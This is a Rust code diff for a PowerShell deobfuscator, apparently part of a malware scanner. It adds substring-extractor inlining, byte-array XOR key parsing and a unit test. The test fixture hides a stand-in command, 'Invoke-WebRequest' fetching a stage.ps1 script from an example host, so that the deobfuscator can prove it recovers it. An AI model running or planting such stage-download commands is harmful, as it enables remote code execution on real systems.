@@ -944,6 +944,14 @@ static PS_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)\breturn\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Substring\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
+    )
+    .expect("ps literal substring extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_GZIP_FUNCTION_GETSTRING_VAR_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\[(?:System\.)?(?:Text\.)?Encoding\]::(?:UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\(*\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*\(*\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*\)*\s*\)\s*\)*\s*\)\s*(?:\.TrimEnd\s*\([^)]*\))?"#,
@@ -957,6 +965,14 @@ static PS_BYTE_ARRAY_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
         r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*@\(\s*((?:\d{1,3}\s*,\s*){2,}\d{1,3})\s*\)"#,
     )
     .expect("ps byte array assign regex")
+});
+
+#[allow(clippy::expect_used)]
+static PS_CAST_BYTE_ARRAY_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\[\s*byte\s*\[\s*\]\s*\]\s*\(\s*((?:\d{1,3}\s*,\s*){2,}\d{1,3})\s*\)"#,
+    )
+    .expect("ps cast byte array assign regex")
 });
 
 #[allow(clippy::expect_used)]
@@ -1099,12 +1115,16 @@ fn expand_gzip_function_base64_variables(text: &str) -> String {
 
 fn expand_xor_base64_function_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
-    if !lower.contains("function ") || !text.contains('@') || !text.contains('\'') {
+    if !lower.contains("function ")
+        || (!text.contains('@') && !lower.contains("[byte"))
+        || !text.contains('\'')
+    {
         return text.to_string();
     }
 
     let keys: Vec<Vec<u8>> = PS_BYTE_ARRAY_ASSIGN_RE
         .captures_iter(text)
+        .chain(PS_CAST_BYTE_ARRAY_ASSIGN_RE.captures_iter(text))
         .take(8)
         .filter_map(|caps| {
             let raw = caps.get(2)?.as_str();
@@ -3125,6 +3145,231 @@ fn expand_invoke_expression_wrappers(text: &str) -> String {
     out
 }
 
+fn expand_literal_substring_extractor_calls(text: &str) -> String {
+    let lower = text.to_ascii_lowercase();
+    if !lower.contains("function ") || !lower.contains(".substring") || !text.contains('\'') {
+        return text.to_string();
+    }
+
+    let mut out = text.to_string();
+    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
+        let Some(caps) = PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE.captures(&body) else {
+            continue;
+        };
+        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(start_var) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(len_var) = caps.get(3).map(|m| m.as_str()) else {
+            continue;
+        };
+
+        let param_index = parse_ps_function_param_indices(&params);
+        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+        let Some(start_idx) = param_index.get(&start_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+        let Some(len_idx) = param_index.get(&len_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+
+        out = inline_ps_literal_substring_calls(&out, &name, value_idx, start_idx, len_idx);
+    }
+    out
+}
+
+fn literal_substring_extractor_defs(text: &str) -> Vec<(String, String, String)> {
+    let bytes = text.as_bytes();
+    let mut defs = Vec::new();
+    for caps in PS_FUNCTION_DEF_RE.captures_iter(text) {
+        let Some(full) = caps.get(0) else { continue };
+        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let mut pos = skip_ascii_ws(bytes, full.end());
+        if bytes.get(pos) != Some(&b'(') {
+            continue;
+        }
+        let Some(params_end) = text[pos + 1..].find(')').map(|rel| pos + 1 + rel) else {
+            continue;
+        };
+        let params = text[pos + 1..params_end].to_string();
+        if params.len() > 256 {
+            continue;
+        }
+        pos = skip_ascii_ws(bytes, params_end + 1);
+        if bytes.get(pos) != Some(&b'{') {
+            continue;
+        }
+        let Some(body_end) = find_simple_ps_block_end(text, pos, 4096) else {
+            continue;
+        };
+        defs.push((
+            name.to_string(),
+            params,
+            text[pos + 1..body_end].to_string(),
+        ));
+    }
+    defs
+}
+
+fn find_simple_ps_block_end(text: &str, open: usize, max_len: usize) -> Option<usize> {
+    let bytes = text.as_bytes();
+    if bytes.get(open) != Some(&b'{') {
+        return None;
+    }
+    let mut pos = open + 1;
+    let limit = text.len().min(open.saturating_add(max_len));
+    while pos < limit {
+        match bytes[pos] {
+            b'\'' => {
+                let (end, _) = parse_ps_single_quoted_literal(text, pos)?;
+                pos = end;
+            }
+            b'"' => {
+                let (end, _) = parse_ps_static_quoted_literal(text, pos)?;
+                pos = end;
+            }
+            b'{' => return None,
+            b'}' => return Some(pos),
+            _ => pos += 1,
+        }
+    }
+    None
+}
+
+fn parse_ps_function_param_indices(params: &str) -> std::collections::HashMap<String, usize> {
+    let mut out = std::collections::HashMap::new();
+    for (idx, raw) in params.split(',').take(8).enumerate() {
+        let raw = raw.trim();
+        let Some(dollar) = raw.rfind('$') else {
+            continue;
+        };
+        let name = raw[dollar + 1..]
+            .chars()
+            .take_while(|ch| ch.is_ascii_alphanumeric() || *ch == '_')
+            .collect::<String>();
+        if !name.is_empty() {
+            out.insert(name.to_ascii_lowercase(), idx);
+        }
+    }
+    out
+}
+
+fn inline_ps_literal_substring_calls(
+    text: &str,
+    name: &str,
+    value_idx: usize,
+    start_idx: usize,
+    len_idx: usize,
+) -> String {
+    let lower = text.to_ascii_lowercase();
+    let needle = name.to_ascii_lowercase();
+    let bytes = text.as_bytes();
+    let mut matches = Vec::new();
+    let mut search_from = 0;
+    let mut match_count = 0;
+
+    while match_count < 128 {
+        let Some(rel) = lower[search_from..].find(&needle) else {
+            break;
+        };
+        let call_start = search_from + rel;
+        let end_name = call_start + name.len();
+        if is_ident_byte(bytes.get(call_start.wrapping_sub(1)).copied())
+            || is_ident_byte(bytes.get(end_name).copied())
+        {
+            search_from = end_name;
+            continue;
+        }
+
+        let mut pos = skip_ascii_ws(bytes, end_name);
+        let parenthesized = bytes.get(pos) == Some(&b'(');
+        if parenthesized {
+            pos = skip_ascii_ws(bytes, pos + 1);
+        }
+        let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
+            search_from = end_name;
+            continue;
+        };
+        if value.len() > 8192 {
+            search_from = value_end;
+            continue;
+        }
+        pos = skip_ps_arg_separator(bytes, value_end, parenthesized);
+        let Some((first_end, first_num)) = parse_ps_usize_arg(text, pos) else {
+            search_from = value_end;
+            continue;
+        };
+        pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
+        let Some((second_end, second_num)) = parse_ps_usize_arg(text, pos) else {
+            search_from = first_end;
+            continue;
+        };
+        let mut call_end = second_end;
+        if parenthesized {
+            let after = skip_ascii_ws(bytes, call_end);
+            if bytes.get(after) != Some(&b')') {
+                search_from = second_end;
+                continue;
+            }
+            call_end = after + 1;
+        }
+
+        if value_idx != 0 || start_idx > 2 || len_idx > 2 {
+            search_from = call_end;
+            continue;
+        }
+        let start = match (start_idx, len_idx) {
+            (1, 2) => first_num,
+            (2, 1) => second_num,
+            _ => {
+                search_from = call_end;
+                continue;
+            }
+        };
+        let len = match (start_idx, len_idx) {
+            (1, 2) => second_num,
+            (2, 1) => first_num,
+            _ => {
+                search_from = call_end;
+                continue;
+            }
+        };
+        let Some(end) = start.checked_add(len) else {
+            search_from = call_end;
+            continue;
+        };
+        if end > value.len() || !value.is_char_boundary(start) || !value.is_char_boundary(end) {
+            search_from = call_end;
+            continue;
+        }
+
+        let replacement = format!("'{}'", value[start..end].replace('\'', "''"));
+        matches.push((call_start, call_end, replacement));
+        search_from = call_end;
+        match_count += 1;
+    }
+
+    let mut out = text.to_string();
+    for (start, end, replacement) in matches.into_iter().rev() {
+        out.replace_range(start..end, &replacement);
+    }
+    out
+}
+
+fn skip_ps_arg_separator(bytes: &[u8], pos: usize, parenthesized: bool) -> usize {
+    let mut pos = skip_ascii_ws(bytes, pos);
+    if parenthesized && bytes.get(pos) == Some(&b',') {
+        pos += 1;
+    }
+    skip_ascii_ws(bytes, pos)
+}
+
 fn inline_ps_literal_calls(text: &str, name: &str) -> String {
     let lower = text.to_ascii_lowercase();
     let needle = name.to_ascii_lowercase();
@@ -3497,6 +3742,7 @@ fn expand_obfuscation(text: &str) -> String {
             }
             if signals.substring {
                 out = expand_ps_dot_substring(&out);
+                out = expand_literal_substring_extractor_calls(&out);
             }
         });
         profile_expand_step!("embedded_single_quote", iter, {
@@ -3598,6 +3844,7 @@ fn expand_obfuscation(text: &str) -> String {
             }
             if signals.substring {
                 out = expand_ps_dot_substring(&out);
+                out = expand_literal_substring_extractor_calls(&out);
             }
         });
         let mut variables_changed = false;
@@ -3694,8 +3941,10 @@ impl PsObfuscationSignals {
         let format = lower.contains("-f") || lower.contains("string]::format");
         let compressed_base64 = (lower.contains("gzipstream") || lower.contains("deflatestream"))
             && lower.contains("base64");
-        let xor_base64_function =
-            has_function_def && text.contains('@') && text.contains('(') && text.contains('\'');
+        let xor_base64_function = has_function_def
+            && (text.contains('@') || lower.contains("[byte"))
+            && text.contains('(')
+            && text.contains('\'');
         let json_script_base64 = lower.contains("convertfrom-json")
             && lower.contains("script")
             && lower.contains("frombase64string");
@@ -5614,6 +5863,36 @@ fn line_has_powershell_payload_flag(line: &str) -> bool {
             Some("EncodedCommand" | "Command")
         )
     })
+}
+
+#[cfg(test)]
+mod literal_substring_extractor_tests {
+    use super::{
+        expand_literal_substring_extractor_calls, literal_substring_extractor_defs,
+        PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
+    };
+
+    #[test]
+    fn literal_substring_extractor_call_is_rewritten() {
+        let text = r#"function Pick($value,$start,$count) {
+  return $value.Substring($start,$count)
+}
+        Pick 'zzInvoke-WebRequest -Uri https://ps-extractor-call.example/stage.ps1yy' 2 66"#;
+
+        let defs = literal_substring_extractor_defs(text);
+        assert_eq!(defs.len(), 1, "unexpected parsed definitions: {defs:?}");
+        assert!(
+            PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE.is_match(&defs[0].2),
+            "substring extractor body was not recognized:\n{}",
+            defs[0].2
+        );
+        let out = expand_literal_substring_extractor_calls(text);
+
+        assert!(
+            out.contains("'Invoke-WebRequest -Uri https://ps-extractor-call.example/stage.ps1'"),
+            "substring extractor call was not rewritten:\n{out}"
+        );
+    }
 }
 
 #[cfg(test)]
